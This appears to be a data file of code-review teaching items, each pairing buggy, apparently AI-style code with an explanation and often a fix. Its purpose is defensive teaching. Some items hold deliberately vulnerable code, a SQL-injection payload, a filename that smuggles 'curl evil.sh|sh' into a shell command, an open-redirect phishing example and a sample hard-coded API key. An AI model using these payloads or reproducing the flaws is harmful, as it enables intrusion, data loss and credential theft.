title: Paginate user results
prContext: Added a paginate() helper so the /users endpoint can return results page by page.
explanation: The docstring says pages are 1-indexed, but the start offset is computed as if they were 0-indexed. Page 1 silently skips the first per_page items, and the last page (page == total_pages) always comes back empty.
whyAiDoesThis: Models have seen 0-indexed and 1-indexed pagination thousands of times each and blend them: the docstring follows one convention and the arithmetic follows the other.

title: Search products by name
prContext: Implemented the product search endpoint with a case-insensitive name filter and a capped result limit.
explanation: The search term is interpolated straight into the SQL string, so q=x' OR 1=1; DROP TABLE products; -- runs arbitrary SQL. The limit is parameterized, which makes the query look safe at a glance, but the user-controlled string isn't.
whyAiDoesThis: Template literals make string-built SQL look tidy. Models often parameterize the obvious numeric value while interpolating the string they're pattern-matching into a LIKE clause.

title: Count lines across files
prContext: Added a CLI helper that totals the line count across every file passed on the command line (often thousands of paths from `find`).
explanation: defer runs when the function returns, not at the end of each loop iteration. Every file stays open until countLines finishes, so a few thousand paths exhaust the process's file-descriptor limit and os.Open starts failing with "too many open files".
whyAiDoesThis: `defer f.Close()` right after `os.Open` is one of the most common lines in Go training data, so models emit it reflexively, even inside loops where it doesn't belong.

title: Weekly digest recipients
prContext: Added the query that builds the recipient list for the weekly digest email.
code:
-- Weekly digest: active users who opted in to email and logged in recently.
-- Soft-deleted accounts have deleted_at set; active accounts have it NULL.
SELECT
    u.id,
    u.email,
    u.display_name,
    COUNT(n.id) AS unread_notifications
FROM users AS u
LEFT JOIN notifications AS n
    ON n.user_id = u.id
   AND n.read_at IS NULL
WHERE u.deleted_at IS NOT NULL
  AND u.email_opt_in = TRUE
  AND u.last_login_at >= NOW() - INTERVAL '30 days'
GROUP BY u.id, u.email, u.display_name
ORDER BY unread_notifications DESC;
explanation: The filter is inverted: it selects only soft-deleted accounts. Every active user stops getting the digest, and people who deleted their accounts start receiving marketing email, which is also a privacy problem.
fixedCode:
-- Weekly digest: active users who opted in to email and logged in recently.
-- Soft-deleted accounts have deleted_at set; active accounts have it NULL.
SELECT
    u.id,
    u.email,
    u.display_name,
    COUNT(n.id) AS unread_notifications
FROM users AS u
LEFT JOIN notifications AS n
    ON n.user_id = u.id
   AND n.read_at IS NULL
WHERE u.deleted_at IS NULL
  AND u.email_opt_in = TRUE
  AND u.last_login_at >= NOW() - INTERVAL '30 days'
GROUP BY u.id, u.email, u.display_name
ORDER BY unread_notifications DESC;
whyAiDoesThis: `IS NOT NULL` is the more common pattern for "has a value" filters, and models pick it without tracking that, for a soft-delete column, a value means the row is gone.

title: Attach authors to comments
prContext: The thread view now shows author names and avatars. Users can delete their accounts; their comments stay up.
explanation: The non-null assertion tells TypeScript the author always exists, but comments from deleted accounts have an authorId with no matching user. Map.get returns undefined, and author.displayName throws, taking down the whole thread for everyone.
whyAiDoesThis: The `!` operator is the fastest way to silence a type error, and models reach for it to make code compile rather than asking what happens when the value really is missing.

title: Payment API client
prContext: Added a thin client for the payments API with request logging to help debug failed charges.
explanation: The live API key is written to the logs on every charge. Logs get shipped to aggregators, shared in tickets and kept for months, so anyone with log access can now move money. The key has to be rotated.
whyAiDoesThis: Asked to "add logging to help debug", models log every variable in scope, and the API key is right there as a field.

title: Generate image thumbnails
prContext: Uploads now get a 256x256 thumbnail generated with ImageMagick right after they're saved.
code:
import subprocess
from pathlib import Path

UPLOAD_DIR = Path("/var/app/uploads")
THUMB_DIR = Path("/var/app/thumbnails")
THUMB_SIZE = "256x256"


def make_thumbnail(filename: str) -> Path:
    """Create a thumbnail for an uploaded image using ImageMagick.

    `filename` is the name the user uploaded, e.g. "cat.png".
    """
    source = UPLOAD_DIR / Path(filename).name  # strip any directory parts
    target = THUMB_DIR / f"{source.stem}_thumb.png"

    if not source.is_file():
        raise FileNotFoundError(source)

    subprocess.run(f"convert {source} -thumbnail {THUMB_SIZE} {target}", shell=True, check=True)
    return target
explanation: The command runs through a shell with the user's filename pasted in. Uploading a file named `x.png;curl evil.sh|sh;.png` passes the existence check (the file really was saved under that name), and the shell then runs the attacker's command on your server.
fixedCode:
import subprocess
from pathlib import Path

UPLOAD_DIR = Path("/var/app/uploads")
THUMB_DIR = Path("/var/app/thumbnails")
THUMB_SIZE = "256x256"


def make_thumbnail(filename: str) -> Path:
    """Create a thumbnail for an uploaded image using ImageMagick.

    `filename` is the name the user uploaded, e.g. "cat.png".
    """
    source = UPLOAD_DIR / Path(filename).name  # strip any directory parts
    target = THUMB_DIR / f"{source.stem}_thumb.png"

    if not source.is_file():
        raise FileNotFoundError(source)

    subprocess.run(["convert", str(source), "-thumbnail", THUMB_SIZE, str(target)], check=True)
    return target
whyAiDoesThis: An f-string with shell=True is the shortest way to "just run the command", and stripping directory parts looks like sanitization even though it does nothing about shell metacharacters.

title: Compare semantic versions
prContext: Added version helpers so the app can prompt users when a newer release is available.
explanation: map passes (value, index) and parseInt treats the second argument as the radix. The minor version is parsed in radix 1, which is always NaN, so every valid version like "1.12.3" throws "Invalid version" and the update check never works.
whyAiDoesThis: `.map(parseInt)` reads like perfectly idiomatic point-free JavaScript, and models trained on lots of `.map(Number)` and `.map(String)` assume parseInt behaves the same way.

title: Reserve stock at checkout
prContext: Checkout now reserves inventory before charging the card so we stop overselling limited drops.
explanation: Two checkouts can both read stock = 1, both pass the check, and both write 0. Each believes it reserved the last unit, so you oversell. Writing an absolute value computed from a stale read loses concurrent updates; the decrement and the stock check need to happen atomically in the UPDATE.
whyAiDoesThis: Read, check, write is how you'd describe the logic in English, and models translate it literally. Nothing in a single-request test reveals the interleaving.

title: Count word frequency
prContext: Added a word counter for the search-analytics page (top terms by frequency).
explanation: The first time a word is seen, counts.get returns null, and `current + 1` auto-unboxes null and throws a NullPointerException. Any input containing even one word crashes.
whyAiDoesThis: Autoboxing hides the null: `current + 1` looks like plain int arithmetic, so models skip the missing-key case they'd handle explicitly with getOrDefault or merge.

title: Route API requests
prContext: Replaced the third-party router with a tiny prefix-based dispatcher for /api/v1 resources.
explanation: strings.TrimLeft treats its second argument as a set of characters, not a prefix. It strips every leading '/', 'a', 'p', 'i', 'v' and '1', so /api/v1/users works by luck, but /api/v1/products becomes "roducts" and /api/v1/accounts becomes "ccounts", and both 404.
whyAiDoesThis: TrimLeft and TrimPrefix sound interchangeable, and the happy-path example ("users") happens to work, so the confusion survives a quick test.

title: Customers with no orders
prContext: Added the audience query for the win-back campaign: opted-in customers who have never ordered.
code:
-- Customers who have never placed an order, for the win-back campaign.
-- orders.customer_id is nullable: guest checkouts have no customer.
SELECT
    c.id,
    c.email,
    c.created_at
FROM customers AS c
WHERE c.marketing_opt_in = TRUE
  AND c.id NOT IN (SELECT o.customer_id FROM orders AS o)
ORDER BY c.created_at DESC;
explanation: As soon as a single guest order with a NULL customer_id exists, `c.id NOT IN (...)` evaluates to NULL rather than TRUE for every customer, so the query returns zero rows. The campaign silently goes out to nobody.
fixedCode:
-- Customers who have never placed an order, for the win-back campaign.
-- orders.customer_id is nullable: guest checkouts have no customer.
SELECT
    c.id,
    c.email,
    c.created_at
FROM customers AS c
WHERE c.marketing_opt_in = TRUE
  AND NOT EXISTS (SELECT 1 FROM orders AS o WHERE o.customer_id = c.id)
ORDER BY c.created_at DESC;
whyAiDoesThis: NOT IN reads exactly like the English requirement, and the three-valued-logic trap only shows up when the subquery contains a NULL, which test fixtures rarely do.

title: Login rate limiter
prContext: Added rate limiting to the login endpoint: at most 5 attempts per minute per client.
code:
import time
from collections import defaultdict, deque


class RateLimiter:
    """Allow at most `limit` requests per `window` seconds for each client."""

    def __init__(self, limit: int = 5, window: float = 60.0):
        self.limit = limit
        self.window = window
        self.hits: dict[str, deque] = defaultdict(deque)

    def allow(self, client_id: str) -> bool:
        now = time.monotonic()
        hits = self.hits[client_id]

        # Drop timestamps that have fallen out of the window.
        while hits and now - hits[0] > self.window:
            hits.popleft()

        if len(hits) < self.limit:
            return False

        hits.append(now)
        return True
explanation: The comparison is inverted: a client under the limit is rejected. Since rejected requests are never recorded, the count stays at 0 forever and every login attempt from every user is refused.
fixedCode:
import time
from collections import defaultdict, deque


class RateLimiter:
    """Allow at most `limit` requests per `window` seconds for each client."""

    def __init__(self, limit: int = 5, window: float = 60.0):
        self.limit = limit
        self.window = window
        self.hits: dict[str, deque] = defaultdict(deque)

    def allow(self, client_id: str) -> bool:
        now = time.monotonic()
        hits = self.hits[client_id]

        # Drop timestamps that have fallen out of the window.
        while hits and now - hits[0] > self.window:
            hits.popleft()

        if len(hits) >= self.limit:
            return False

        hits.append(now)
        return True
whyAiDoesThis: Models often write the condition for the happy path ("under the limit") and then attach the branch for the rejection path, flipping the meaning without noticing.

title: Validate calendar dates
prContext: Added date helpers for the booking form so users can't pick impossible dates like Feb 30.
explanation: Gregorian century years are leap years only if divisible by 400. With this check, 1900 and 2100 count as leap years, so isValidDate(2100, 2, 29) and isValidDate(1900, 2, 29) wrongly return true (think birth dates and long-range bookings).
whyAiDoesThis: "Divisible by 4" is the rule most people remember, and the century exception never shows up in tests that only use recent years.

title: Binary search helper
prContext: Replaced a linear scan with binary search over the sorted price-tier table.
explanation: high starts one past the last index, but the loop treats it as inclusive (low <= high). Searching for a value larger than every element, or searching an empty array, makes mid equal sorted.length and throws ArrayIndexOutOfBoundsException instead of returning -1.
whyAiDoesThis: Binary search has two equally common conventions (inclusive high with <=, exclusive high with <), and models mix the initialization from one with the loop condition from the other.

title: Track window width
prContext: Added a useWindowWidth() hook so the layout can switch to the compact toolbar on narrow screens.
explanation: removeEventListener only removes the exact function reference that was added. The cleanup passes a brand-new arrow function, so nothing is removed. Every mount (route changes, StrictMode's double effects) leaves another listener behind that keeps calling setState for components that no longer exist.
whyAiDoesThis: Wrapping callbacks in `() => fn()` is a habit models pick up from JSX event props, where it's harmless; in add/remove listener pairs it silently breaks identity.

title: Load JSON config
prContext: Moved service settings out of env vars into a config.json loaded at startup.
explanation: The error check is inverted. A valid config returns an error ("parse config: %!w(<nil>)") so the service refuses to start, while a malformed config returns a half-populated Config with no error and the service boots with zero values like Port 0.
whyAiDoesThis: `err != nil` appears so often that models autocomplete the shape of the line and occasionally flip a single character, and it compiles fine either way.

title: Dedupe imported emails
prContext: Contact-list import now removes duplicate emails (case-insensitive) before inserting. Lists are often 100k+ rows.
explanation: For every email it rebuilds a lowercased copy of the whole result list and scans it, which is O(n²) time plus a fresh list allocation per row. Ten rows are instant; a 100k-row import does billions of operations and times out.
whyAiDoesThis: The list comprehension is correct and reads naturally, and models optimize for code that's obviously right on small examples rather than thinking about input size.

title: Monthly revenue by plan
prContext: Added the monthly revenue report for the finance dashboard, one row per active plan.
code:
-- Monthly report: every active plan with its paid invoices this month.
-- Plans with no paid invoices this month must still appear with 0.
SELECT
    p.id,
    p.name,
    COUNT(i.id) AS paid_invoices,
    COALESCE(SUM(i.amount_cents), 0) AS revenue_cents
FROM plans AS p
LEFT JOIN invoices AS i
    ON i.plan_id = p.id
   AND i.issued_at >= DATE_TRUNC('month', NOW())
WHERE p.is_active = TRUE
  AND i.status = 'paid'
GROUP BY p.id, p.name
ORDER BY revenue_cents DESC;
explanation: Filtering on i.status in WHERE discards the NULL rows the LEFT JOIN produced for plans without matching invoices, which turns it into an inner join. Plans with no paid invoices this month vanish from the report instead of showing 0, exactly the case the comment promises to handle.
fixedCode:
-- Monthly report: every active plan with its paid invoices this month.
-- Plans with no paid invoices this month must still appear with 0.
SELECT
    p.id,
    p.name,
    COUNT(i.id) AS paid_invoices,
    COALESCE(SUM(i.amount_cents), 0) AS revenue_cents
FROM plans AS p
LEFT JOIN invoices AS i
    ON i.plan_id = p.id
   AND i.issued_at >= DATE_TRUNC('month', NOW())
   AND i.status = 'paid'
WHERE p.is_active = TRUE
GROUP BY p.id, p.name
ORDER BY revenue_cents DESC;
whyAiDoesThis: Models put all filters in WHERE by default. The difference between filtering in ON and in WHERE only matters for outer joins, and only when the empty case occurs.

title: Order ownership check
prContext: Added an ownership check so users can only view their own orders.
explanation: `!=` on two Long objects compares references, not values. Java caches boxed values from -128 to 127, so the check passes in tests with small IDs, but every real user with ID 128 or above gets "Not your order" when opening their own orders.
whyAiDoesThis: With primitive `long` this code would be correct, and models don't consistently track when a value is boxed. The Integer cache also makes the bug invisible in small test fixtures.

title: Fetch with retries
prContext: Wrapped calls to the flaky inventory API in a retry helper with exponential backoff.
explanation: With retries = 3 there should be 1 initial try plus 3 retries, but the loop runs only 3 times in total. It also sleeps after the final failure for nothing, and with retries = 0 it never makes a request at all and throws undefined.
whyAiDoesThis: `for (let i = 0; i < n; i++)` is the default loop shape, and models apply it even when n counts retries on top of a first attempt.

title: Truncate notification preview
prContext: Push notifications for new chat messages now show a 40-character preview of the message.
explanation: The length check counts runes (characters), but the slice cuts bytes. For Hindi, Japanese or emoji, where one character is 2-4 bytes, the cut lands in the middle of a character and produces invalid UTF-8, which shows up as � in the notification, and the preview is much shorter than 40 characters.
whyAiDoesThis: String slicing works perfectly on the ASCII examples models mostly see in tests, and Go's "strings are bytes" rule is easy to forget right after calling a rune-aware function.

title: Send password reset email
prContext: Password reset emails now go out through SendGrid instead of our old SMTP relay.
code:
import os

import requests

SENDGRID_URL = "https://api.sendgrid.com/v3/mail/send"
# Fall back to the team key so local setups work out of the box.
SENDGRID_API_KEY = os.environ.get("SENDGRID_API_KEY", "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")
FROM_ADDRESS = "no-reply@example.com"


def send_password_reset(to_email: str, reset_link: str) -> None:
    payload = {
        "personalizations": [{"to": [{"email": to_email}]}],
        "from": {"email": FROM_ADDRESS},
        "subject": "Reset your password",
        "content": [{"type": "text/plain", "value": f"Reset your password: {reset_link}"}],
    }
    response = requests.post(
        SENDGRID_URL,
        json=payload,
        headers={"Authorization": f"Bearer {SENDGRID_API_KEY}"},
        timeout=10,
    )
    response.raise_for_status()
explanation: A real API key is committed as the fallback value. It now lives in git history forever and in every clone, CI log and fork, so anyone with repo access can send email as your domain (perfect for phishing). Remove it, rotate the key, and fail fast when the env var is missing.
fixedCode:
import os

import requests

SENDGRID_URL = "https://api.sendgrid.com/v3/mail/send"
SENDGRID_API_KEY = os.environ["SENDGRID_API_KEY"]  # fail fast if it is missing
FROM_ADDRESS = "no-reply@example.com"


def send_password_reset(to_email: str, reset_link: str) -> None:
    payload = {
        "personalizations": [{"to": [{"email": to_email}]}],
        "from": {"email": FROM_ADDRESS},
        "subject": "Reset your password",
        "content": [{"type": "text/plain", "value": f"Reset your password: {reset_link}"}],
    }
    response = requests.post(
        SENDGRID_URL,
        json=payload,
        headers={"Authorization": f"Bearer {SENDGRID_API_KEY}"},
        timeout=10,
    )
    response.raise_for_status()
whyAiDoesThis: Models are trained to make code "work out of the box", and a default value for a missing env var is a common pattern, fine for a port number but disastrous for a credential.

title: Safe post-login redirect
prContext: After login we now redirect users back to the page they came from via ?next=, restricted to our own domains.
explanation: endsWith("example.com") also matches evil-example.com or notexample.com, domains anyone can register. An attacker sends a login link with ?next=https://evil-example.com/login, and after signing in the victim lands on a convincing phishing page.
whyAiDoesThis: "Ends with our domain" sounds like the right rule, and models rarely test hostnames that merely share a suffix without a dot boundary.

title: Import CSV rows
prContext: Added a CSV importer for the nightly product sync (files exported by our own system, no quoted fields).
explanation: close() is only reached on the happy path. An empty file returns early, and any IOException mid-read skips it, so the file handle leaks each time. A nightly job that runs for weeks eventually hits the open-file limit. try-with-resources closes the reader on every path.
whyAiDoesThis: An explicit close() at the end looks responsible, and models often add early returns later in the same function without re-checking that cleanup still runs on every path.

title: Admin order export
prContext: Added the admin CSV export that joins orders with customer details.
explanation: Array.find scans the customer list for every order: 50k × 20k is up to a billion comparisons. The export freezes the Node event loop for seconds (every other request on that server stalls too), and it gets quadratically worse as the business grows. Build a Map once for O(1) lookups.
whyAiDoesThis: find() inside map() is the most direct translation of "look up each order's customer", and with the 3-item arrays in typical examples it's instant.

title: Transfer between accounts
prContext: Moved money transfers into a single PL/pgSQL function so the API makes one round-trip.
explanation: The balance is read without a lock. Two concurrent transfers of $80 from a $100 account both read 100, both pass the funds check, and both write 20. $160 leaves the account but only $80 is debited. SELECT ... FOR UPDATE makes the second transfer wait for the first.
whyAiDoesThis: Wrapping logic in a function feels atomic, and models assume a transaction alone prevents interleaving. Under READ COMMITTED it doesn't: the row has to be locked explicitly.

title: Concurrent health check
prContext: The status page now checks all upstream services in parallel (shared client with a 5s timeout) instead of one by one.
explanation: Many goroutines append to the same slice at once. append reads the length, maybe reallocates, and writes back, so concurrent appends overwrite each other. When several services are down at the same moment, some silently disappear from the status page. `go test -race` flags it immediately.
whyAiDoesThis: The WaitGroup makes the code look properly synchronized. Models conflate "waiting for goroutines to finish" with "protecting shared state", which are different problems.

title: Summarize with OpenAI
prContext: Added a "Summarize" button to the editor that calls OpenAI. Key is read from env, not hard-coded.
explanation: NEXT_PUBLIC_ variables are inlined into the JavaScript bundle at build time. Anyone can open DevTools, read the OpenAI key from the request headers or the bundle, and run up your bill. Browser code must call your own API route, which keeps the key server-side.
whyAiDoesThis: Reading the key from env feels like the secure pattern, and when the client can't see an env var models "fix" it by adding the NEXT_PUBLIC_ prefix the error message suggests.

title: Today's orders widget
prContext: Added the "orders today" widget to the admin dashboard; it refreshes every 30 seconds.
code:
-- Dashboard widget: order count and revenue for today.
-- orders has ~40M rows and a B-tree index on created_at (TIMESTAMPTZ).
-- The session time zone is set to the store's local zone.
SELECT
    COUNT(*) AS orders_today,
    COUNT(DISTINCT o.customer_id) AS customers_today,
    COALESCE(SUM(o.total_cents), 0) AS revenue_cents
FROM orders AS o
WHERE DATE(o.created_at) = CURRENT_DATE
  AND o.status <> 'cancelled';
explanation: Wrapping the column in DATE() means the index on created_at can't be used, so Postgres scans all 40M rows on every refresh. The dashboard crawls and the database burns CPU. A plain range on the raw column gives the same result with an index range scan over today's rows.
fixedCode:
-- Dashboard widget: order count and revenue for today.
-- orders has ~40M rows and a B-tree index on created_at (TIMESTAMPTZ).
-- The session time zone is set to the store's local zone.
SELECT
    COUNT(*) AS orders_today,
    COUNT(DISTINCT o.customer_id) AS customers_today,
    COALESCE(SUM(o.total_cents), 0) AS revenue_cents
FROM orders AS o
WHERE o.created_at >= CURRENT_DATE
  AND o.created_at < CURRENT_DATE + 1
  AND o.status <> 'cancelled';
whyAiDoesThis: DATE(col) = CURRENT_DATE is the most literal way to write "today", and models rarely reason about whether the planner can use an index on the column.
